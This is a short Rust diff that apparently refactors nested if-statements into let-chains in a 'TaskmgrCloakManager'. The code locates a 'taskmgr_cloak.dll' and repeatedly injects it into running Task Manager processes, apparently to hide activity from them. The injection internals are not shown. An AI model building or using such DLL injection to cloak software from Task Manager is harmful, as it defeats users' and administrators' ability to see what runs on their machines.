@@ -178,8 +178,8 @@ impl TaskmgrCloakManager {
             }
         }
 
-        if let Ok(current_exe) = std::env::current_exe() {
-            if let Some(parent) = current_exe.parent() {
+        if let Ok(current_exe) = std::env::current_exe()
+            && let Some(parent) = current_exe.parent() {
                 let p1 = parent.join("taskmgr_cloak.dll");
                 if p1.exists() {
                     return Some(p1);
@@ -189,7 +189,6 @@ impl TaskmgrCloakManager {
                     return Some(p2);
                 }
             }
-        }
 
         None
     }
@@ -294,11 +293,10 @@ impl TaskmgrCloakManager {
                 if let Some(dll_path) = Self::find_cloak_dll() {
                     let targets = Self::find_task_managers();
                     for pid in targets {
-                        if !injected.contains(&pid) {
-                            if Self::inject_taskmgr_cloak(pid, &dll_path) {
+                        if !injected.contains(&pid)
+                            && Self::inject_taskmgr_cloak(pid, &dll_path) {
                                 injected.insert(pid);
                             }
-                        }
                     }
                 }
 
